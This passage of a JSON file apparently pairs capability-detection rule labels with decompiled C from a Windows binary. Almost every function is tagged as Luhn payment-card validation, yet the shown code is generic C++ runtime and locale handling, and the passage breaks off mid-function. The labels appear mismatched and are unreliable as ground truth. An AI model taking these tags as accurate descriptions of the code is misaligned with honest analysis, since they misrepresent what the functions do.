        "decompiled_code": "\nchar * fcn.14001a420(ulong arg1)\n\n{\n    if ((arg1 & 0x7d) < 0x7d) {\n    // switch table (125 cases) at 0x140100c44\n        switch(*((arg1 & 0x7d) * 4 + 0x140100c44) + 0x140100c44) {\n        case 0x14001a448:\n            return 0x140100c18;\n        case 0x14001a450:\n            return 0x140100c39;\n        case 0x14001a460:\n            return 0x140100c2a;\n        case 0x14001a470:\n            return 0x140100c1a;\n        case 0x14001a480:\n            return 0x140100c32;\n        case 0x14001a488:\n            return 0x140100c15;\n        case 0x14001a490:\n            return 0x140100c20;\n        case 0x14001a498:\n            return 0x140100c3c;\n        case 0x14001a4a0:\n            return 0x140100c23;\n        case 0x14001a4a8:\n            return 0x140100c40;\n        case 0x14001a4b0:\n            return 0x140100c26;\n        case 0x14001a4b8:\n            return \"w+bx\";\n        case 0x14001a4c0:\n            return 0x140100c35;\n        case 0x14001a4c8:\n            return 0x140100c1e;\n        case 0x14001a4d0:\n            return 0x140100c12;\n        case 0x14001a4e0:\n            return 0x140100c10;\n        }\n    }\n    return NULL;\n}\n",
        "token_count": 434
    },
    "14001a54": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.14001a540(ulong *arg1)\n\n{\n    int32_t iVar1;\n    ulong *arg1_00;\n    int64_t arg1_01;\n    int64_t iVar2;\n    \n    if (**0x140102a70 != 0) {\n        iVar1 = fcn.14000eab0(*arg1);\n        if (iVar1 != 0) {\n            arg1_00 = fcn.1400b6600(8);\n            iVar2 = 0x1401046e0;\n            *arg1_00 = 0x140109120;\n            arg1_01 = fcn.1400b6bc0(arg1_00, 0x1401046e0, 0x14001bba0);\n            if (iVar2 == -1) {\n                fcn.1400b6730(arg1_01);\n            }\n            fcn.14000f000(arg1_01);\n            sub.msvcrt.dll__fileno_1(*(arg1_01 + 0x50));\n            return;\n        }\n    }\n    return;\n}\n",
        "token_count": 242
    },
    "14007bef": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.14007bef0(ulong *arg1)\n\n{\n    sub.msvcrt.dll__fileno_1(*arg1);\n    return;\n}\n",
        "token_count": 35
    },
    "14001a5e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.14001a5e0(ulong *arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    ulong uVar1;\n    char cVar2;\n    \n    fcn.140085530(arg1);\n    *arg1 = 0x140108ec0;\n    fcn.14007c1c0(arg1 + 10, arg2);\n    cVar2 = fcn.1400211d0(arg1 + 10);\n    if (cVar2 == '\\0') {\n        return;\n    }\n    *(arg1 + 0xc) = arg3;\n    arg1[0xf] = arg4;\n    fcn.140083790(arg1);\n    uVar1 = arg1[0xe];\n    arg1[6] = 0;\n    *(arg1 + 0x81) = 0;\n    arg1[3] = uVar1;\n    arg1[1] = uVar1;\n    arg1[2] = uVar1;\n    *(arg1 + 4) = 0x0;\n    return;\n}\n",
        "token_count": 240
    },
    "14001aa1": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.14001aa10(ulong *arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    ulong uVar1;\n    char cVar2;\n    \n    fcn.140087bb0(arg1);\n    *arg1 = 0x140108f40;\n    fcn.14007c1c0(arg1 + 10, arg2);\n    cVar2 = fcn.1400211d0(arg1 + 10);\n    if (cVar2 == '\\0') {\n        return;\n    }\n    *(arg1 + 0xc) = arg3;\n    arg1[0xf] = arg4;\n    fcn.140085d70(arg1);\n    uVar1 = arg1[0xe];\n    arg1[6] = 0;\n    *(arg1 + 0x81) = 0;\n    arg1[3] = uVar1;\n    arg1[1] = uVar1;\n    arg1[2] = uVar1;\n    *(arg1 + 4) = 0x0;\n    return;\n}\n",
        "token_count": 240
    },
    "14001bf3": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.14001bf30(void)\n\n{\n    ulong *arg1;\n    \n    arg1 = fcn.1400b6600(8);\n    *arg1 = 0x140109120;\n    fcn.1400b6bc0(arg1, 0x1401046e0, 0x14001bba0);\n    if (*0x1400f9b78 != 0) {\n        fcn.1400185e0();\n        *0x1400f9b78 = 0;\n    }\n    return;\n}\n",
        "token_count": 123
    },
    "14001c06": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.14001c060(ulong arg1, ulong arg2, ulong arg3, ulong *arg4)\n\n{\n    char cVar1;\n    \n    cVar1 = fcn.14006c350(arg1, arg2);\n    if (cVar1 != '\\0') {\n        *arg4 = arg3;\n        arg4[2] = 0x10;\n        *(arg4 + 1) = 6;\n    }\n    return;\n}\n",
        "token_count": 102
    },
    "14001ef1": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint64_t fcn.14001ef10(int64_t *arg1, ulong noname_1, uint64_t arg3)\n\n{\n    uint64_t uVar1;\n    \n    uVar1 = *(*arg1 + -0x18);\n    if (arg3 < uVar1) {\n        do {\n            if (*(*arg1 + arg3) != noname_1) {\n                return arg3;\n            }\n            arg3 = arg3 + 1;\n        } while (arg3 != uVar1);\n    }\n    return 0xffffffffffffffff;\n}\n",
        "token_count": 123
    },
    "140020af": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.140020af0(int64_t arg1, uchar *arg2, ulong arg3, ulong arg4)\n\n{\n    ulong uVar1;\n    int64_t iVar2;\n    ulong uVar3;\n    ulong in_stack_00000028;\n    \n    uVar1 = sub.msvcrt.dll_setlocale(0, 0);\n    iVar2 = sub.msvcrt.dll_strlen(uVar1);\n    uVar3 = fcn.1400b64f0(iVar2 + 1);\n    sub.msvcrt.dll_memcpy(uVar3, uVar1, iVar2 + 1);\n    sub.msvcrt.dll_setlocale(0, *(arg1 + 0x20));\n    iVar2 = sub.msvcrt.dll_strftime(arg2, arg3, arg4, in_stack_00000028);\n    sub.msvcrt.dll_setlocale(0, uVar3);\n    fcn.1400b64c0(uVar3);\n    if (iVar2 == 0) {\n        *arg2 = 0;\n    }\n    return;\n}\n",
        "token_count": 232
    },
    "140020e1": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.140020e10(int64_t arg1, ushort *arg2, ulong arg3, ulong arg4)\n\n{\n    ulong uVar1;\n    int64_t iVar2;\n    ulong uVar3;\n    ulong in_stack_00000028;\n    \n    uVar1 = sub.msvcrt.dll_setlocale(0, 0);\n    iVar2 = sub.msvcrt.dll_strlen(uVar1);\n    uVar3 = fcn.1400b64f0(iVar2 + 1);\n    sub.msvcrt.dll_memcpy(uVar3, uVar1, iVar2 + 1);\n    sub.msvcrt.dll_setlocale(0, *(arg1 + 0x20));\n    iVar2 = sub.msvcrt.dll_wcsftime(arg2, arg3, arg4, in_stack_00000028);\n    sub.msvcrt.dll_setlocale(0, uVar3);\n    fcn.1400b64c0(uVar3);\n    if (iVar2 == 0) {\n        *arg2 = 0;\n    }\n    return;\n}\n",
        "token_count": 233
    },
    "140020fc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t fcn.140020fc0(int64_t *arg1)\n\n{\n    int64_t *piVar1;\n    int64_t iVar2;\n    int64_t arg3;\n    ulong *arg1_00;\n    \n    arg3 = fcn.1400261c0(0x1400fb980);\n    piVar1 = *(*arg1 + 0x18) + arg3 * 8;\n    iVar2 = *piVar1;\n    if (iVar2 != 0) {\n        return iVar2;\n    }\n    arg1_00 = fcn.1400b6520(0x90);\n    *(arg1_00 + 1) = 0;\n    *arg1_00 = 0x14010b3c0;\n    arg1_00[2] = 0;\n    arg1_00[3] = 0;\n    *(arg1_00 + 4) = 0;\n    arg1_00[5] = 0;\n    arg1_00[6] = 0;\n    arg1_00[7] = 0;\n    arg1_00[8] = 0;\n    *(arg1_00 + 9) = 0;\n    *(arg1_00 + 0x11) = 0;\n    fcn.140097870(arg1_00, arg1);\n    fcn.14009d930(*arg1, arg1_00, arg3);\n    return *piVar1;\n}\n",
        "token_count": 327
    },
    "1400210c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t fcn.1400210c0(int64_t *arg1)\n\n{\n    int64_t *piVar1;\n    int64_t iVar2;\n    int64_t arg3;\n    ulong *arg1_00;\n    \n    arg3 = fcn.1400261c0(0x1400fb990);\n    piVar1 = *(*arg1 + 0x18) + arg3 * 8;\n    iVar2 = *piVar1;\n    if (iVar2 != 0) {\n        return iVar2;\n    }\n    arg1_00 = fcn.1400b6520(0xd0);\n    *(arg1_00 + 1) = 0;\n    *arg1_00 = 0x14010b3e0;\n    arg1_00[2] = 0;\n    arg1_00[3] = 0;\n    *(arg1_00 + 4) = 0;\n    arg1_00[5] = 0;\n    arg1_00[6] = 0;\n    arg1_00[7] = 0;\n    arg1_00[8] = 0;\n    *(arg1_00 + 9) = 0;\n    *(arg1_00 + 0x19) = 0;\n    fcn.140097f50(arg1_00, arg1);\n    fcn.14009d930(*arg1, arg1_00, arg3);\n    return *piVar1;\n}\n",
        "token_count": 329
    },
    "140025b6": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t fcn.140025b60(int64_t *arg1, uint64_t arg2, ulong arg3)\n\n{\n    uint8_t uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    \n    uVar3 = arg2;\n    uVar1 = *(arg1 + (arg2 & 0xff) + 0x139);\n    uVar2 = uVar1;\n    if (uVar1 == 0) {\n        if (*(*arg1 + 0x40) != 0x140025c30) {\n            uVar3 = (**(*arg1 + 0x40))(arg1, arg2, arg3);\n        }\n        uVar2 = uVar3;\n        if (arg3 != uVar3) {\n            *(arg1 + (arg2 & 0xff) + 0x139) = uVar3;\n        }\n    }\n    return uVar2;\n}\n",
        "token_count": 208
    },
    "1400261c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t fcn.1400261c0(uint64_t *arg1)\n\n{\n    uint64_t uVar1;\n    int32_t iVar2;\n    \n    uVar1 = *arg1;\n    if (uVar1 == 0) {\n        if (**0x140102a70 != 0) {\n            LOCK();\n            iVar2 = *0x1400fb730 + 1;\n            LOCK();\n            *0x1400fb730 = *0x1400fb730 + 1;\n            *arg1 = *arg1 ^ (*arg1 == 0) * (*arg1 ^ iVar2);\n            return *arg1 - 1;\n        }\n        *0x1400fb730 = *0x1400fb730 + 1;\n        uVar1 = *0x1400fb730;\n        *arg1 = uVar1;\n    }\n    return uVar1 - 1;\n}\n",
        "token_count": 200
    },
    "14002682": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nchar ** fcn.140026820(char *arg1, int64_t arg2)\n\n{\n    int32_t *piVar1;\n    int64_t iVar2;\n    ulong *puVar3;\n    char **arg1_00;\n    char *pcVar4;\n    int64_t *piVar5;\n    ulong arg1_01;\n    \n    puVar3 = fcn.1400b6c10(arg1, 0x140104f20, 0x140104f10, 0xfffffffffffffffe);\n    if (puVar3 == NULL) {\n        if (arg2 == *0x140102f90) {\n            arg1_00 = fcn.1400b6520(0x28);\n            piVar5 = fcn.1400b6520(0x90);\n            *(piVar5 + 1) = 0;\n            iVar2 = *0x140103380;\n            piVar5[2] = 0;\n            piVar5[3] = 0;\n            *(piVar5 + 4) = '\\0';\n            *piVar5 = iVar2 + 0x10;\n            iVar2 = *0x140103510;\n            piVar5[5] = 0;\n            piVar5[6] = 0;\n            piVar5[7] = 0;\n            piVar5[8] = 0;\n            *(piVar5 + 9) = 0;\n            *(piVar5 + 0x11) = '\\0';\n            *(arg1_00 + 1) = 0;\n            *arg1_00 = iVar2 + 0x10;\n            arg1_00[2] = piVar5;\n            fcn.1400adc80(arg1_00);\n            piVar1 = *0x140102a70;\n            arg1_00[3] = arg1;\n            if (*piVar1 == 0) {\n                *(arg1 + 8) = *(arg1 + 8) + 1;\n            }\n            else {\n                LOCK();\n                *(arg1 + 8) = *(arg1 + 8) + 1;\n            }\n            arg1_00[4] = piVar5;\n            *arg1_00 = 0x140109350;\n            fcn.1400817b0(0, arg1, piVar5);\n        }\n        else if (arg2 == *0x140102ee0) {\n            arg1_00 = fcn.1400b6520(0x20);\n            *(arg1_00 + 1) = 0;\n            *arg1_00 = *0x1401034a0 + 0x10;\n            pcVar4 = fcn.14009f6c0();\n            arg1_00[2] = pcVar4;\n            piVar1 = *0x140102a70;\n            arg1_00[3] = arg1;\n            if (*piVar1 == 0) {\n                *(arg1 + 8) = *(arg1 + 8) + 1;\n            }\n            else {\n                LOCK();\n                *(arg1 + 8) = *(arg1 + 8) + 1;\n            }\n            *arg1_00 = 0x140109150;\n        }\n        else if (arg2 == *0x140102fb0) {\n            arg1_00 = fcn.1400b6520(0x18);\n            *(arg1_00 + 1) = 0;\n            iVar2 = *0x140103530;\n            arg1_00[2] = arg1;\n            *arg1_00 = iVar2 + 0x10;\n            if (**0x140102a70 == 0) {\n                *(arg1 + 8) = *(arg1 + 8) + 1;\n            }\n            else {\n                LOCK();\n                *(arg1 + 8) = *(arg1 + 8) + 1;\n            }\n            *arg1_00 = 0x140109490;\n        }\n        else if (arg2 == *0x140103000) {\n            arg1_00 = fcn.1400b6520(0x18);\n            *(arg1_00 + 1) = 0;\n            iVar2 = *0x1401035a0;\n            arg1_00[2] = arg1;\n            *arg1_00 = iVar2 + 0x10;\n            if (**0x140102a70 == 0) {\n                *(arg1 + 8) = *(arg1 + 8) + 1;\n            }\n            else {\n                LOCK();\n                *(arg1 + 8) = *(arg1 + 8) + 1;\n            }\n            *arg1_00 = 0x1401095f0;\n        }\n        else if (arg2 == *0x140103020) {\n            arg1_00 = fcn.1400b6520(0x18);\n            *(arg1_00 + 1) = 0;\n            iVar2 = *0x1401035c0;\n            arg1_00[2] = arg1;\n            *arg1_00 = iVar2 + 0x10;\n            if (**0x140102a70 == 0) {\n                *(arg1 + 8) = *(arg1 + 8) + 1;\n            }\n            else {\n                LOCK();\n                *(arg1 + 8) = *(arg1 + 8) + 1;\n            }\n            *arg1_00 = 0x1401096b0;\n        }\n        else if (arg2 == *0x140102bf0) {\n            arg1_00 = fcn.1400b6520(0x28);\n            piVar5 = fcn.1400b6520(0x70);\n            *(piVar5 + 1) = 0;\n            iVar2 = *0x1401033e0;\n            piVar5[2] = 0;\n            piVar5[3] = 0;\n            *(piVar5 + 4) = '\\0';\n            *piVar5 = iVar2 + 0x10;\n            iVar2 = *0x140103210;\n            *(piVar5 + 0x21) = 0;\n            piVar5[5] = 0;\n            piVar5[6] = 0;\n            piVar5[7] = 0;\n            piVar5[8] = 0;\n            piVar5[9] = 0;\n            piVar5[10] = 0;\n            *(piVar5 + 0xb) = 0;\n            *(piVar5 + 0x5c) = 0;\n            *(piVar5 + 0x6f) = '\\0';\n            *(arg1_00 + 1) = 0;\n            *arg1_00 = iVar2 + 0x10;\n            arg1_00[2] = piVar5;\n            fcn.140079010(arg1_00);\n            piVar1 = *0x140102a70;\n            arg1_00[3] = arg1;\n            if (*piVar1 == 0) {\n                *(arg1 + 8) = *(arg1 + 8) + 1;\n            }\n            else {\n                LOCK();\n                *(arg1 + 8) = *(arg1 + 8) + 1;\n            }\n            arg1_00[4] = piVar5;\n            *arg1_00 = 0x140109850;\n            fcn.140082530(0, arg1, piVar5);\n        }\n        else if (arg2 == *0x140102be0) {\n            arg1_00 = fcn.1400b6520(0x28);\n            piVar5 = fcn.1400b6520(0x70);\n            *(piVar5 + 1) = 0;\n            iVar2 = *0x1401033d0;\n            piVar5[2] = 0;\n            piVar5[3] = 0;\n            *(piVar5 + 4) = '\\0';\n            *piVar5 = iVar2 + 0x10;\n            iVar2 = *0x140103200;\n            *(piVar5 + 0x21) = 0;\n            piVar5[5] = 0;\n            piVar5[6] = 0;\n            piVar5[7] = 0;\n            piVar5[8] = 0;\n            piVar5[9] = 0;\n            piVar5[10] = 0;\n            *(piVar5 + 0xb) = 0;\n            *(piVar5 + 0x5c) = 0;\n            *(piVar5 + 0x6f) = '\\0';\n            *(arg1_00 + 1) = 0;\n            *arg1_00 = iVar2 + 0x10;\n            arg1_00[2] = piVar5;\n            fcn.140078c40(arg1_00);\n            piVar1 = *0x140102a70;\n            arg1_00[3] = arg1;\n            if (*piVar1 == 0) {\n                *(arg1 + 8) = *(arg1 + 8) + 1;\n            }\n            else {\n                LOCK();\n                *(arg1 + 8) = *(arg1 + 8) + 1;\n            }\n            arg1_00[4] = piVar5;\n            *arg1_00 = 0x140109770;\n            fcn.140082060(0, arg1, piVar5);\n        }\n        else if (arg2 == *0x140102f70) {\n            arg1_00 = fcn.1400b6520(0x28);\n            fcn.1400ad9d0(arg1_00, 0);\n            piVar1 = *0x140102a70;\n            arg1_00[4] = arg1;\n            if (*piVar1 == 0) {\n                *(arg1 + 8) = *(arg1 + 8) + 1;\n            }\n            else {\n                LOCK();\n                *(arg1 + 8) = *(arg1 + 8) + 1;\n            }\n            *arg1_00 = 0x140109250;\n        }\n        else if (arg2 == *0x140102fa0) {\n            arg1_00 = fcn.1400b6520(0x28);\n            piVar5 = fcn.1400b6520(0xd0);\n            *(piVar5 + 1) = 0;\n            iVar2 = *0x140103390;\n            piVar5[2] = 0;\n            piVar5[3] = 0;\n            *(piVar5 + 4) = '\\0';\n            *piVar5 = iVar2 + 0x10;\n            iVar2 = *0x140103520;\n            piVar5[5] = 0;\n            piVar5[6] = 0;\n            piVar5[7] = 0;\n            piVar5[8] = 0;\n            *(piVar5 + 9) = 0;\n            *(piVar5 + 0x19) = '\\0';\n            *(arg1_00 + 1) = 0;\n            *arg1_00 = iVar2 + 0x10;\n            arg1_00[2] = piVar5;\n            fcn.1400ae040(arg1_00);\n            piVar1 = *0x140102a70;\n            arg1_00[3] = arg1;\n            if (*piVar1 == 0) {\n                *(arg1 + 8) = *(arg1 + 8) + 1;\n            }\n            else {\n                LOCK();\n                *(arg1 + 8) = *(arg1 + 8) + 1;\n            }\n            arg1_00[4] = piVar5;\n            *arg1_00 = 0x1401093f0;\n            fcn.140081bc0(0, arg1, piVar5);\n        }\n        else if (arg2 == *0x140102ef0) {\n            arg1_00 = fcn.1400b6520(0x20);\n            *(arg1_00 + 1) = 0;\n            *arg1_00 = *0x1401034b0 + 0x10;\n            pcVar4 = fcn.14009f6c0();\n            arg1_00[2] = pcVar4;\n            piVar1 = *0x140102a70;\n            arg1_00[3] = arg1;\n            if (*piVar1 == 0) {\n                *(arg1 + 8) = *(arg1 + 8) + 1;\n            }\n            else {\n                LOCK();\n                *(arg1 + 8) = *(arg1 + 8) + 1;\n            }\n            *arg1_00 = 0x1401091d0;\n        }\n        else if (arg2 == *0x140102fc0) {\n            arg1_00 = fcn.1400b6520(0x18);\n            *(arg1_00 + 1) = 0;\n            iVar2 = *0x140103540;\n            arg1_00[2] = arg1;\n            *arg1_00 = iVar2 + 0x10;\n            if (**0x140102a70 == 0) {\n                *(arg1 + 8) = *(arg1 + 8) + 1;\n            }\n            else {\n                LOCK();\n                *(arg1 + 8) = *(arg1 + 8) + 1;\n            }\n            *arg1_00 = 0x140109540;\n        }\n        else if (arg2 == *0x140103010) {\n            arg1_00 = fcn.1400b6520(0x18);\n            *(arg1_00 + 1) = 0;\n            iVar2 = *0x1401035b0;\n            arg1_00[2] = arg1;\n            *arg1_00 = iVar2 + 0x10;\n            if (**0x140102a70 == 0) {\n                *(arg1 + 8) = *(arg1 + 8) + 1;\n            }\n            else {\n                LOCK();\n                *(arg1 + 8) = *(arg1 + 8) + 1;\n            }\n            *arg1_00 = 0x140109650;\n        }\n        else if (arg2 == *0x140103030) {\n            arg1_00 = fcn.1400b6520(0x18);\n            *(arg1_00 + 1) = 0;\n            iVar2 = *0x1401035d0;\n            arg1_00[2] = arg1;\n            *arg1_00 = iVar2 + 0x10;\n            if (**0x140102a70 == 0) {\n                *(arg1 + 8) = *(arg1 + 8) + 1;\n            }\n            else {\n                LOCK();\n                *(arg1 + 8) = *(arg1 + 8) + 1;\n            }\n            *arg1_00 = 0x140109710;\n        }\n        else if (arg2 == *0x140102c10) {\n            arg1_00 = fcn.1400b6520(0x28);\n            piVar5 = fcn.1400b6520(0x80);\n            *(piVar5 + 1) = 0;\n            iVar2 = *0x140103400;\n            piVar5[2] = 0;\n            piVar5[3] = 0;\n            *(piVar5 + 4) = '\\0';\n            *piVar5 = iVar2 + 0x10;\n            iVar2 = *0x140103230;\n            *(piVar5 + 0x22) = 0;\n            piVar5[5] = 0;\n            piVar5[6] = 0;\n            piVar5[7] = 0;\n            piVar5[8] = 0;\n            piVar5[9] = 0;\n            piVar5[10] = 0;\n            *(piVar5 + 0xb) = 0;\n            *(piVar5 + 0x5c) = 0;\n            *(piVar5 + 0x7a) = '\\0';\n            *(arg1_00 + 1) = 0;\n            *arg1_00 = iVar2 + 0x10;\n            arg1_00[2] = piVar5;\n            fcn.1400797c0(arg1_00);\n            piVar1 = *0x140102a70;\n            arg1_00[3] = arg1;\n            if (*piVar1 == 0) {\n                *(arg1 + 8) = *(arg1 + 8) + 1;\n            }\n            else {\n                LOCK();\n                *(arg1 + 8) = *(arg1 + 8) + 1;\n            }\n            arg1_00[4] = piVar5;\n            *arg1_00 = \"P\\a\\b@\\x01\";\n            fcn.140083030(0, arg1, piVar5);\n        }\n        else if (arg2 == *0x140102c00) {\n            arg1_00 = fcn.1400b6520(0x28);\n            piVar5 = fcn.1400b6520(0x80);\n            *(piVar5 + 1) = 0;\n            iVar2 = *0x1401033f0;\n            piVar5[2] = 0;\n            piVar5[3] = 0;\n            *(piVar5 + 4) = '\\0';\n            *piVar5 = iVar2 + 0x10;\n            iVar2 = *0x140103220;\n            *(piVar5 + 0x22) = 0;\n            piVar5[5] = 0;\n            piVar5[6] = 0;\n            piVar5[7] = 0;\n            piVar5[8] = 0;\n            piVar5[9] = 0;\n            piVar5[10] = 0;\n            *(piVar5 + 0xb) = 0;\n            *(piVar5 + 0x5c) = 0;\n            *(piVar5 + 0x7a) = '\\0';\n            *(arg1_00 + 1) = 0;\n            *arg1_00 = iVar2 + 0x10;\n            arg1_00[2] = piVar5;\n            fcn.1400793e0(arg1_00);\n            piVar1 = *0x140102a70;\n            arg1_00[3] = arg1;\n            if (*piVar1 == 0) {\n                *(arg1 + 8) = *(arg1 + 8) + 1;\n            }\n            else {\n                LOCK();\n                *(arg1 + 8) = *(arg1 + 8) + 1;\n            }\n            arg1_00[4] = piVar5;\n            *arg1_00 = 0x140109930;\n            fcn.140082a80(0, arg1, piVar5);\n        }\n        else {\n            if (arg2 != *0x140102f80) {\n                arg1_01 = fcn.1400b7080(0x1400fd758);\n                fcn.14009f7d0(arg2);\n                do {\n                    fcn.1400b64d0(arg2);\n                    arg1_01 = fcn.14000f000(arg1_01);\n                } while( true );\n            }\n            arg1_00 = fcn.1400b6520(0x28);\n            fcn.1400adba0(arg1_00, 0);\n            piVar1 = *0x140102a70;\n            arg1_00[4] = arg1;\n            if (*piVar1 == 0) {\n                *(arg1 + 8) = *(arg1 + 8) + 1;\n            }\n            else {\n                LOCK();\n                *(arg1 + 8) = *(arg1 + 8) + 1;\n            }\n            *arg1_00 = 0x1401092d0;\n        }\n    }\n    else {\n        arg1_00 = *puVar3;\n    }\n    return arg1_00;\n}\n",
        "token_count": 4562
    },
    "14002732": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t * fcn.140027320(int64_t arg1, int64_t arg2)\n\n{\n    int32_t *piVar1;\n    int64_t **ppiVar2;\n    int64_t *arg1_00;\n    int64_t iVar3;\n    int64_t *piVar4;\n    ulong arg1_01;\n    \n    ppiVar2 = fcn.1400b6c10(arg1, 0x140104f20, 0x140104f10, 0xfffffffffffffffe);\n    if (ppiVar2 == NULL) {\n        if (arg2 == *0x140102e00) {\n            arg1_00 = fcn.1400b6520(0x28);\n            piVar4 = fcn.1400b6520(0x90);\n            *(piVar4 + 1) = 0;\n            iVar3 = *0x140103380;\n            piVar4[2] = 0;\n            piVar4[3] = 0;\n            *(piVar4 + 4) = 0;\n            *piVar4 = iVar3 + 0x10;\n            iVar3 = *0x140103150;\n            piVar4[5] = 0;\n            piVar4[6] = 0;\n            piVar4[7] = 0;\n            piVar4[8] = 0;\n            *(piVar4 + 9) = 0;\n            *(piVar4 + 0x11) = 0;\n            *(arg1_00 + 1) = 0;\n            *arg1_00 = iVar3 + 0x10;\n            arg1_00[2] = piVar4;\n            fcn.1400ab020(arg1_00);\n            piVar1 = *0x140102a70;\n            arg1_00[3] = arg1;\n            if (*piVar1 == 0) {\n                *(arg1 + 8) = *(arg1 + 8) + 1;\n            }\n            else {\n                LOCK();\n                *(arg1 + 8) = *(arg1 + 8) + 1;\n            }\n            arg1_00[4] = piVar4;\n            *arg1_00 = 0x1401093a0;\n            fcn.140081590(0, arg1, piVar4);\n        }\n        else if (arg2 == *0x140102dc0) {\n            arg1_00 = fcn.1400b6520(0x20);\n            *(arg1_00 + 1) = 0;\n            *arg1_00 = *0x140103130 + 0x10;\n            iVar3 = fcn.14009f6c0();\n            arg1_00[2] = iVar3;\n            piVar1 = *0x140102a70;\n            arg1_00[3] = arg1;\n            if (*piVar1 == 0) {\n                *(arg1 + 8) = *(arg1 + 8) + 1;\n            }\n            else {\n                LOCK();\n                *(arg1 + 8) = *(arg1 + 8) + 1;\n            }\n            *arg1_00 = 0x140109190;\n        }\n        else if (arg2 == *0x140102e20) {\n            arg1_00 = fcn.1400b6520(0x18);\n            *(arg1_00 + 1) = 0;\n            iVar3 = *0x140103170;\n            arg1_00[2] = arg1;\n            *arg1_00 = iVar3 + 0x10;\n            if (**0x140102a70 == 0) {\n                *(arg1 + 8) = *(arg1 + 8) + 1;\n            }\n            else {\n                LOCK();\n                *(arg1 + 8) = *(arg1 + 8) + 1;\n            }\n            *arg1_00 = 0x1401094e0;\n        }\n        else if (arg2 == *0x140102e40) {\n            arg1_00 = fcn.1400b6520(0x18);\n            *(arg1_00 + 1) = 0;\n            iVar3 = *0x140103190;\n            arg1_00[2] = arg1;\n            *arg1_00 = iVar3 + 0x10;\n            if (**0x140102a70 == 0) {\n                *(arg1 + 8) = *(arg1 + 8) + 1;\n            }\n            else {\n                LOCK();\n                *(arg1 + 8) = *(arg1 + 8) + 1;\n            }\n            *arg1_00 = 0x140109620;\n        }\n        else if (arg2 == *0x140102e60) {\n            arg1_00 = fcn.1400b6520(0x18);\n            *(arg1_00 + 1) = 0;\n            iVar3 = *0x1401031b0;\n            arg1_00[2] = arg1;\n            *arg1_00 = iVar3 + 0x10;\n            if (**0x140102a70 == 0) {\n                *(arg1 + 8) = *(arg1 + 8) + 1;\n            }\n            else {\n                LOCK();\n                *(arg1 + 8) = *(arg1 + 8) + 1;\n            }\n            *arg1_00 = 0x1401096e0;\n        }\n        else if (arg2 == *0x140102d90) {\n            arg1_00 = fcn.1400b6520(0x28);\n            piVar4 = fcn.1400b6520(0x70);\n            *(piVar4 + 1) = 0;\n            iVar3 = *0x1401033e0;\n            piVar4[2] = 0;\n            piVar4[3] = 0;\n            *(piVar4 + 4) = 0;\n            *piVar4 = iVar3 + 0x10;\n            iVar3 = *0x140103100;\n            *(piVar4 + 0x21) = 0;\n            piVar4[5] = 0;\n            piVar4[6] = 0;\n            piVar4[7] = 0;\n            piVar4[8] = 0;\n            piVar4[9] = 0;\n            piVar4[10] = 0;\n            *(piVar4 + 0xb) = 0;\n            *(piVar4 + 0x5c) = 0;\n            *(piVar4 + 0x6f) = 0;\n            *(arg1_00 + 1) = 0;\n            *arg1_00 = iVar3 + 0x10;\n            arg1_00[2] = piVar4;\n            fcn.14009fff0(arg1_00);\n            piVar1 = *0x140102a70;\n            arg1_00[3] = arg1;\n            if (*piVar1 == 0) {\n                *(arg1 + 8) = *(arg1 + 8) + 1;\n            }\n            else {\n                LOCK();\n                *(arg1 + 8) = *(arg1 + 8) + 1;\n            }\n            arg1_00[4] = piVar4;\n            *arg1_00 = 0x1401098c0;\n            fcn.140082250(0, arg1, piVar4);\n        }\n        else if (arg2 == *0x140102d80) {\n            arg1_00 = fcn.1400b6520(0x28);\n            piVar4 = fcn.1400b6520(0x70);\n            *(piVar4 + 1) = 0;\n            iVar3 = *0x1401033d0;\n            piVar4[2] = 0;\n            piVar4[3] = 0;\n            *(piVar4 + 4) = 0;\n            *piVar4 = iVar3 + 0x10;\n            iVar3 = *0x1401030f0;\n            *(piVar4 + 0x21) = 0;\n            piVar4[5] = 0;\n            piVar4[6] = 0;\n            piVar4[7] = 0;\n            piVar4[8] = 0;\n            piVar4[9] = 0;\n            piVar4[10] = 0;\n            *(piVar4 + 0xb) = 0;\n            *(piVar4 + 0x5c) = 0;\n            *(piVar4 + 